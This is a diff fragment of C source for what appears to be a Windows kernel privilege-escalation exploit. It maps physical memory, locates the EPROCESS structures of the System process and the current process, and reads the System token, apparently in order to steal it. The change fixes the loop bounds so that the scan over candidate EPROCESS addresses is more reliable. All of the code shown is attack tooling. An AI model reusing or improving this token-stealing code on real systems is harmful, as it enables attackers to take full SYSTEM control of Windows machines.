@@ -75,14 +75,15 @@ int main(int argc, char** argv)
 
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
-	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_SYSTEM_size) == -1)
+	int occurrences_system = GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_SYSTEM_size);
+	if (occurrences_system == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
 	unsigned __int64 systemToken = 0;
 
-	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+	for (int i = 0; i < occurrences_system; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
@@ -104,14 +105,14 @@ int main(int argc, char** argv)
 
 	const int EPROCESS_cmd_size = 50;
 	unsigned __int64 EPROCESS_cmd[EPROCESS_cmd_size];
-
-	if (GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size) == -1)
+	int occurrences_cmd = GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size);
+	if (occurrences_cmd == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
 
-	for (size_t i = 0; i < EPROCESS_cmd_size; i++) {
+	for (size_t i = 0; i < occurrences_cmd; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
